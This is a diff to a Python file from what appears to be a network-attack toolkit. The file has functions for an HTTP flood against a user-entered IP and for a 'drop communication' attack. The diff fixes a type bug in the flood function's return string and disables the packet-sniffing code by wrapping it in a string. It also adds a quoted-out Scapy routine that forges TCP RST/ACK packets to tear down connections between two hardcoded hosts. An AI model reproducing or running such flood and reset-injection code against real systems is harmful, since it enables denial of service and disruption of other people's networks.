@@ -419,7 +419,7 @@ def perform_http_flood_attack(ip_addr=None, port=80):
     # Wait for the attack thread to finish
     attack_thread.join()
 
-    return "HTTP flood attack performed on " + ip_addr + " to port " + port
+    return "HTTP flood attack performed on " + ip_addr + " to port " + str(port)
 
 
 # (15) Code to perform drop communication
@@ -428,6 +428,7 @@ def perform_drop_communication(ip_addr=None):
         # Get input from the user
         ip_addr = input("Enter the IP address to attack: ")
 
+    """
     # Create a packet filter to capture packets from the specified IP address
     filter_str = "ip src {}".format(ip_addr)
 
@@ -459,6 +460,18 @@ def perform_drop_communication(ip_addr=None):
     # Start sniffing packets and call the packet_handler for each captured packet
     print("Start sniffing...")
     sniff(filter=filter_str, prn=packet_handler)
+    """
+    """
+    print("telnet reset\n")
+    def do_rst(pkt):
+        ip = IP(src=pkt[IP].dst, dst=pkt[IP].src)
+        tcp = TCP(sport=pkt[TCP].dport, dport=pkt[TCP].sport, 
+        flags=0x14, seq=pkt[TCP].ack, ack=pkt[TCP].seq+1) # 0x14 = 20 --> RST/ACK
+        pkt = ip/tcp
+        # ls(pkt)
+        send(pkt,verbose=0)
+    sniff(iface="eth1", filter='host ' + "192.168.200.35" + ' and host ' + "192.168.200.40" + ' and port ' + str(args.dstPORT), prn=do_rst)
+    """
 
     return "Drop communication performed on IP address: {}".format(ip_addr)
 
